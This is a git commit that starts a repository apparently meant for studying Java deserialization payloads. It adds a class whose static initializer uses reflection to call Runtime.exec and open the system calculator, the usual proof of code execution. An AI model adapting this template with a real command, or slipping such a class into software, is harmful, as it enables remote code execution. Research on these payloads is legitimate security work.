ee6b70a9807d799e2181f6057ae58dea089b6646
a1phaboy <a1phaboy0xcc@gmail.com>
2022-09-04 01:24:59 +0800

    Initial commit

---
+++ README.md
@@ -0,0 +1,2 @@
+# deserPayloads
+ some useful payload to analysis Deserialization in java env
---
+++ src/main/java/calc.java
@@ -0,0 +1,22 @@
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+public class calc {
+    static{
+        String winCalc = "calc.exe";
+        String MacCalc = "open /System/Applications/Calculator.app";
+        try{
+            Class os = Class.forName("java.lang.System");
+            Constructor m = os.getDeclaredConstructor();
+            m.setAccessible(true);
+            Object sys = os.getMethod("getProperty",String.class).invoke(m.newInstance(),"os.name");
+
+            Class clazz = Class.forName("java.lang.Runtime");
+            clazz.getMethod("exec",String.class)
+                    .invoke(clazz.getMethod("getRuntime")
+                            .invoke(clazz),sys.toString().startsWith("Win") ? winCalc : MacCalc);
+        } catch (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException | InstantiationException e) {
+            e.printStackTrace();
+        }
+    }
+
+}
